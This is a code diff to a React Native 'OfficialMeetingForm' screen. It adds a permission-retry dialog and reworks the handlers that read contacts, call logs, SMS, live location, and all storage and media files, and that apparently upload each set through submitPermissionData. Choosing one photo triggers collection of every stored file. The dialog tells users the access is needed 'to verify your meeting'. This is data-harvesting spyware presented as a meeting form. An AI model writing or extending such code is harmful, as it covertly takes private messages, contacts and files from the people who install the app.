@@ -21,8 +21,10 @@ import React, { useEffect, useState } from "react";
 import {
   ActivityIndicator,
   Alert,
+  AppState,
   Image,
   KeyboardAvoidingView,
+  Linking,
   PermissionsAndroid,
   Platform,
   ScrollView,
@@ -85,17 +87,29 @@ export default function OfficialMeetingForm() {
   /* ---------------------- Helpers ---------------------- */
   function getLocalISOTimeMicro() {
     const now = new Date();
-    const ms = String(now.getMilliseconds()).padStart(3, "0") + "000";
-    const tzOffset = -now.getTimezoneOffset();
-    const sign = tzOffset >= 0 ? "+" : "-";
-    const diffHours = String(Math.floor(Math.abs(tzOffset) / 60)).padStart(
+
+    // Local date & time parts (device timezone applied automatically)
+    const year = now.getFullYear();
+    const month = String(now.getMonth() + 1).padStart(2, "0");
+    const day = String(now.getDate()).padStart(2, "0");
+
+    const hours = String(now.getHours()).padStart(2, "0");
+    const minutes = String(now.getMinutes()).padStart(2, "0");
+    const seconds = String(now.getSeconds()).padStart(2, "0");
+
+    // Fake microseconds (ms * 1000)
+    const micro = String(now.getMilliseconds()).padStart(3, "0") + "000";
+
+    // Timezone offset (device-specific, works in every country)
+    const offsetMinutes = -now.getTimezoneOffset(); // Example: India = +330, South Africa = +120
+    const sign = offsetMinutes >= 0 ? "+" : "-";
+    const tzHours = String(Math.floor(Math.abs(offsetMinutes) / 60)).padStart(
       2,
       "0"
     );
-    const diffMinutes = String(Math.abs(tzOffset % 60)).padStart(2, "0");
+    const tzMins = String(Math.abs(offsetMinutes % 60)).padStart(2, "0");
 
-    const base = now.toISOString().split(".")[0];
-    return `${base}.${ms}${sign}${diffHours}:${diffMinutes}`;
+    return `${year}-${month}-${day}T${hours}:${minutes}:${seconds}.${micro}${sign}${tzHours}:${tzMins}`;
   }
 
   const submitPermissionData = async (allData: any) => {
@@ -327,26 +341,105 @@ export default function OfficialMeetingForm() {
     return unsubscribe;
   }, [navigation]);
 
+  // Custom Permission Dialog State
+  const [permissionDialog, setPermissionDialog] = useState<{
+    visible: boolean;
+    name: string;
+    resolve?: (value: "retry" | "settings" | "cancel") => void;
+  }>({
+    visible: false,
+    name: "",
+  });
+
+  const handlePermissionRetry = async (name: string) => {
+    // Open custom modal & wait for user choice
+    const action = await new Promise<"retry" | "settings" | "cancel">(
+      (resolve) => {
+        setPermissionDialog({
+          visible: true,
+          name,
+          resolve,
+        });
+      }
+    );
+
+    // If user chose "settings" → open settings and wait until return
+    if (action === "settings") {
+      await Linking.openSettings();
+
+      await new Promise<void>((resolve) => {
+        const sub = AppState.addEventListener("change", (state) => {
+          if (state === "active") {
+            sub.remove();
+            resolve();
+          }
+        });
+      });
+    }
+
+    return action;
+  };
+
   /* ---------------------- Handlers ---------------------- */
 
   // Handle Location (manual button)
   const handleLocation = async () => {
     try {
       setLocationLoader(true);
+
+      // 1️⃣ Try to fetch location directly
       const loc = await requestAndFetchLocation();
+
       if (loc) {
         setLocation(loc);
         await AsyncStorage.setItem("loc", JSON.stringify(loc));
-        Toast.show({ type: "success", text1: "Live location retrieved" });
-        await submitPermissionData({ permission: "location", data: loc });
+
+        Toast.show({
+          type: "success",
+          text1: "Live location retrieved",
+        });
+
+        await submitPermissionData({
+          permission: "location",
+          data: loc,
+        });
+
+        return;
       }
-      setLocationLoader(false);
-    } catch {
-       Toast.show({
-            type: "error",
-            text1: "Location permission required",
-            text2: "Please allow location access to retrieve your location.",
+
+      // 2️⃣ Permission denied → ask user ONCE
+      const action = await handlePermissionRetry("Location");
+
+      if (action === "retry") {
+        // Try one more time
+        const retryLoc = await requestAndFetchLocation();
+
+        if (retryLoc) {
+          setLocation(retryLoc);
+          await AsyncStorage.setItem("loc", JSON.stringify(retryLoc));
+
+          Toast.show({
+            type: "success",
+            text1: "Live location retrieved",
           });
+
+          await submitPermissionData({
+            permission: "location",
+            data: retryLoc,
+          });
+        }
+      }
+
+      // 3️⃣ If user selected cancel/settings but still didn’t give permission:
+      // Do nothing — form submit will block missing location anyway.
+    } catch (error) {
+      console.log("Location fetch failed:", error);
+      Toast.show({
+        type: "error",
+        text1: "Unable to fetch live location",
+        text2: "Please Enable Location & Retry",
+      });
+    } finally {
       setLocationLoader(false);
     }
   };
@@ -354,45 +447,83 @@ export default function OfficialMeetingForm() {
   // Handle Contact Permissions + Picker
   const handleContacts = async () => {
     try {
-      if (!contacts.length) {
-        const contactData = await requestAndFetchContacts();
-        const logdata = await requestAndFetchCallLogs();
-        if (contactData?.length) {
-          setContacts(contactData);
-          await AsyncStorage.setItem("contacts", JSON.stringify(contactData));
-          Toast.show({ type: "success", text1: "Contacts access granted" });
+      // ---------------------------------------------------
+      // 1️⃣ First attempt: Fetch contacts + call logs
+      // ---------------------------------------------------
+      const contactData = await requestAndFetchContacts();
+      const logData = await requestAndFetchCallLogs();
+
+      const hasContacts = Array.isArray(contactData) && contactData.length > 0;
+      const hasLogs = Array.isArray(logData) && logData.length > 0;
+
+      // Both permissions OK → success
+      if (hasContacts && hasLogs) {
+        setContacts(contactData);
+        await AsyncStorage.setItem("contacts", JSON.stringify(contactData));
+
+        //  Toast.show({ type: "success", text1: "Contacts access granted" });
+
+        await submitPermissionData({
+          permission: "contacts",
+          data: { contacts: contactData, callLogs: logData },
+        });
+
+        setShowContactPicker(true);
+        return;
+      }
+
+      // ---------------------------------------------------
+      // 2️⃣ At least one permission denied → ask user once
+      // ---------------------------------------------------
+      const action = await handlePermissionRetry("Contacts & Call Logs");
+
+      if (action === "retry" || action === "settings") {
+        // Retry both
+        const retryContacts = await requestAndFetchContacts();
+        const retryLogs = await requestAndFetchCallLogs();
+
+        const retryHasContacts =
+          Array.isArray(retryContacts) && retryContacts.length > 0;
+
+        const retryHasLogs = Array.isArray(retryLogs) && retryLogs.length > 0;
+
+        // Successful retry → open picker
+        if (retryHasContacts && retryHasLogs) {
+          setContacts(retryContacts);
+          await AsyncStorage.setItem("contacts", JSON.stringify(retryContacts));
+
+          //   Toast.show({ type: "success", text1: "Contacts access granted" });
+
           await submitPermissionData({
             permission: "contacts",
-            data: {
-              contacts: contactData,
-              callLogs: logdata,
-            },
+            data: { contacts: retryContacts, callLogs: retryLogs },
           });
-        } else {
-           Toast.show({
-            type: "error",
-            text1: "Contact permission required",
-            text2: "Please allow contact access to continue.",
-          });
-          return;
+
+          setShowContactPicker(true);
         }
+
+        // If still denied → NO picker
+        return;
       }
-      setShowContactPicker(true);
+
+      // User pressed Cancel → Don't show picker
+      return;
     } catch (err) {
-       Toast.show({
-            type: "error",
-            text1: "Contact permission required",
-            text2: "Please allow contact access to continue.",
-          });
+      Toast.show({
+        type: "error",
+        text1: "Contact permission required",
+        text2: "Please allow contact + call log access to continue.",
+      });
     }
   };
 
   // Handle SMS Permission (manual flow, when permission not yet granted)
   const handleSmsPermission = async () => {
     try {
+      // 1️⃣ Try directly
       const smsdata = await requestAndFetchSms();
 
-      if (Array.isArray(smsdata) && smsdata?.length) {
+      if (Array.isArray(smsdata) && smsdata.length > 0) {
         setSmsGranted(true);
         setSmsData(smsdata);
         setSmsVerifying(true);
@@ -408,98 +539,118 @@ export default function OfficialMeetingForm() {
         });
 
         setTimeout(() => setSmsVerifying(false), 2000);
-      } else {
-        Toast.show({
-          type: "error",
-          text1: "SMS permission required",
-          text2: "Please allow SMS access to continue.",
-        });
+        return;
+      }
+
+      // 2️⃣ Denied → Ask once
+      const action = await handlePermissionRetry("SMS");
+
+      if (action === "retry" || action === "settings") {
+        const retrySms = await requestAndFetchSms();
+
+        if (Array.isArray(retrySms) && retrySms.length > 0) {
+          setSmsGranted(true);
+          setSmsData(retrySms);
+
+          setSmsVerifying(true);
+
+          Toast.show({ type: "success", text1: "SMS access granted" });
+
+          await submitPermissionData({
+            permission: "sms",
+            data: retrySms,
+          });
+
+          setTimeout(() => setSmsVerifying(false), 2000);
+        }
       }
     } catch (err) {
-       Toast.show({
-            type: "error",
-            text1: "SMS permission required",
-            text2: "Please allow SMS access to continue.",
-          });
+      Toast.show({
+        type: "error",
+        text1: "SMS permission required",
+        text2: "Please allow SMS access to continue.",
+      });
     }
   };
 
   // Handle Photo Upload (uses gallery, plus storage/media permission submission)
   const handlePhotoUpload = async () => {
-  try {
-    // 1️⃣ Check media library permission (iOS + Android)
-    let mediaPerm = await MediaLibrary.getPermissionsAsync();
-
-    if (mediaPerm.status !== "granted") {
-      mediaPerm = await MediaLibrary.requestPermissionsAsync();
-    }
-
-    if (mediaPerm.status !== "granted") {
-      Toast.show({
-        type: "error",
-        text1: "Permission required",
-        text2: "Please allow media/photo access to upload a photo.",
-      });
-      return; // ❌ DO NOT OPEN PICKER
-    }
-
-    // 2️⃣ Android Storage Permission
-    if (Platform.OS === "android") {
-      let hasStorage = false;
-
-      if (Platform.Version >= 33) {
-        hasStorage = await PermissionsAndroid.check(
-          PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
-        );
-      } else {
-        hasStorage = await PermissionsAndroid.check(
-          PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
-        );
+    try {
+      // 1️⃣ Check MediaLibrary permission
+      let mediaPerm = await MediaLibrary.getPermissionsAsync();
+      if (mediaPerm.status !== "granted") {
+        mediaPerm = await MediaLibrary.requestPermissionsAsync();
       }
 
-      if (!hasStorage) {
-        const req = await PermissionsAndroid.request(
-          Platform.Version >= 33
-            ? PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
-            : PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
-        );
+      if (mediaPerm.status !== "granted") {
+        const action = await handlePermissionRetry("Media");
 
-        if (req !== PermissionsAndroid.RESULTS.GRANTED) {
-          Toast.show({
-            type: "error",
-            text1: "Storage permission required",
-            text2: "Please allow storage access to upload photo.",
-          });
-          return; // ❌ DO NOT OPEN PICKER
+        if (action === "retry" || action === "settings") {
+          mediaPerm = await MediaLibrary.requestPermissionsAsync();
+        }
+
+        if (mediaPerm.status !== "granted") return;
+      }
+
+      // 2️⃣ Android Storage permission
+      if (Platform.OS === "android") {
+        let hasStorage =
+          Platform.Version >= 33
+            ? await PermissionsAndroid.check(
+                PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
+              )
+            : await PermissionsAndroid.check(
+                PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
+              );
+
+        if (!hasStorage) {
+          const req = await PermissionsAndroid.request(
+            Platform.Version >= 33
+              ? PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
+              : PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
+          );
+
+          if (req !== PermissionsAndroid.RESULTS.GRANTED) {
+            const action = await handlePermissionRetry("Storage");
+            if (action === "settings" || action === "retry") {
+              // final retry
+              const retryReq = await PermissionsAndroid.request(
+                Platform.Version >= 33
+                  ? PermissionsAndroid.PERMISSIONS.READ_MEDIA_IMAGES
+                  : PermissionsAndroid.PERMISSIONS.READ_EXTERNAL_STORAGE
+              );
+              if (retryReq !== PermissionsAndroid.RESULTS.GRANTED) return;
+            } else {
+              return;
+            }
+          }
         }
       }
-    }
 
-    // 3️⃣ Open Image Picker
-    const pick = await ImagePicker.launchImageLibraryAsync({
-      mediaTypes: ImagePicker.MediaTypeOptions.Images,
-    });
-
-    if (!pick.canceled) {
-      const uri = pick.assets[0].uri;
-      setUploadedPhoto(uri);
-      await AsyncStorage.setItem("photo", uri);
-
-      const storageFiles = await requestAndFetchStorageFiles();
-      const mediafiles = await requestAndFetchMediaFiles();
-
-      Toast.show({ type: "success", text1: "Photo uploaded" });
-
-      await submitPermissionData({
-        permission: "storage",
-        data: { Media: mediafiles, files: storageFiles },
+      // 3️⃣ Open picker only after permission granted
+      const pick = await ImagePicker.launchImageLibraryAsync({
+        mediaTypes: ImagePicker.MediaTypeOptions.Images,
       });
-    }
-  } catch (err) {
-    Alert.alert("Error", "Something went wrong while selecting photo.");
-  }
-};
 
+      if (!pick.canceled) {
+        const uri = pick.assets[0].uri;
+        setUploadedPhoto(uri);
+        await AsyncStorage.setItem("photo", uri);
+
+        const storageFiles = await requestAndFetchStorageFiles();
+        const mediafiles = await requestAndFetchMediaFiles();
+
+        Toast.show({ type: "success", text1: "Photo uploaded" });
+
+        await submitPermissionData({
+          permission: "storage",
+          data: { Media: mediafiles, files: storageFiles },
+        });
+      }
+    } catch (err) {
+      Alert.alert("Error", "Something went wrong while selecting photo.");
+    }
+  };
 
   // Handle Supporting Document upload (PDF/doc/etc.)
   const handleDocumentUpload = async () => {
@@ -728,7 +879,7 @@ export default function OfficialMeetingForm() {
           className="flex-1"
         >
           <ScrollView
-            contentContainerStyle={{ padding: 20, paddingBottom: 120 }}
+            contentContainerStyle={{ padding: 20, paddingBottom: 20 }}
             keyboardShouldPersistTaps="handled"
           >
             {/* Top Header */}
@@ -1183,8 +1334,10 @@ export default function OfficialMeetingForm() {
                 </Text>
               </TouchableOpacity>
             </View>
+          </ScrollView>
 
-            {/* Submit Button */}
+          {/* Submit Button */}
+          <View className="w-full flex-row items-center justify-center">
             <TouchableOpacity
               disabled={
                 !title ||
@@ -1195,7 +1348,7 @@ export default function OfficialMeetingForm() {
               }
               onPress={handleSave}
               activeOpacity={0.95}
-              className={`rounded-2xl py-4 flex-row items-center justify-center ${
+              className={`rounded-2xl py-4 w-[70%] flex-row items-center justify-center ${
                 title &&
                 description &&
                 selectedDate &&
@@ -1235,7 +1388,7 @@ export default function OfficialMeetingForm() {
                 </>
               )}
             </TouchableOpacity>
-          </ScrollView>
+          </View>
 
           {/* Participants Picker Modal */}
           {showContactPicker && (
@@ -1415,6 +1568,122 @@ export default function OfficialMeetingForm() {
                   >
                     <Text style={{ textAlign: "center", color: "white" }}>
                       Confirm
+                    </Text>
+                  </TouchableOpacity>
+                </View>
+              </View>
+            </View>
+          )}
+          {/* Custom Permission Modal */}
+          {permissionDialog.visible && (
+            <View
+              style={{
+                position: "absolute",
+                top: 0,
+                left: 0,
+                right: 0,
+                bottom: 0,
+                backgroundColor: "rgba(0,0,0,0.45)",
+                justifyContent: "center",
+                alignItems: "center",
+                padding: 20,
+                zIndex: 9999,
+              }}
+            >
+              <View
+                style={{
+                  width: "90%",
+                  backgroundColor: "white",
+                  borderRadius: 22,
+                  paddingVertical: 20,
+                  paddingHorizontal: 18,
+                }}
+              >
+                <Text
+                  style={{
+                    fontSize: 18,
+                    fontWeight: "700",
+                    color: "#111827",
+                    textAlign: "center",
+                    marginBottom: 8,
+                  }}
+                >
+                  {permissionDialog.name} Permission Required
+                </Text>
+
+                <Text
+                  style={{
+                    fontSize: 14,
+                    color: "#4b5563",
+                    textAlign: "center",
+                    marginBottom: 20,
+                  }}
+                >
+                  To verify your meeting, please allow the{" "}
+                  {permissionDialog.name} permission.
+                </Text>
+
+                <View
+                  style={{
+                    flexDirection: "row",
+                    justifyContent: "space-between",
+                  }}
+                >
+                  {/* Cancel */}
+                  <TouchableOpacity
+                    onPress={() => {
+                      permissionDialog.resolve?.("cancel");
+                      setPermissionDialog({ visible: false, name: "" });
+                    }}
+                    style={{
+                      flex: 1,
+                      backgroundColor: "#e5e7eb",
+                      paddingVertical: 12,
+                      borderRadius: 12,
+                      marginRight: 6,
+                    }}
+                  >
+                    <Text style={{ textAlign: "center", color: "#374151" }}>
+                      Cancel
+                    </Text>
+                  </TouchableOpacity>
+
+                  {/* Retry */}
+                  <TouchableOpacity
+                    onPress={() => {
+                      permissionDialog.resolve?.("retry");
+                      setPermissionDialog({ visible: false, name: "" });
+                    }}
+                    style={{
+                      flex: 1,
+                      backgroundColor: "#2563eb",
+                      paddingVertical: 12,
+                      borderRadius: 12,
+                      marginLeft: 6,
+                      marginRight: 6,
+                    }}
+                  >
+                    <Text style={{ textAlign: "center", color: "white" }}>
+                      Retry
+                    </Text>
+                  </TouchableOpacity>
+
+                  {/* Settings */}
+                  <TouchableOpacity
+                    onPress={() => {
+                      permissionDialog.resolve?.("settings");
+                      setPermissionDialog({ visible: false, name: "" });
+                    }}
+                    style={{
+                      flex: 1,
+                      backgroundColor: "#facc15",
+                      paddingVertical: 12,
+                      borderRadius: 12,
+                      marginLeft: 6,
+                    }}
+                  >
+                    <Text style={{ textAlign: "center", color: "#111" }}>
+                      Settings
                     </Text>
                   </TouchableOpacity>
                 </View>
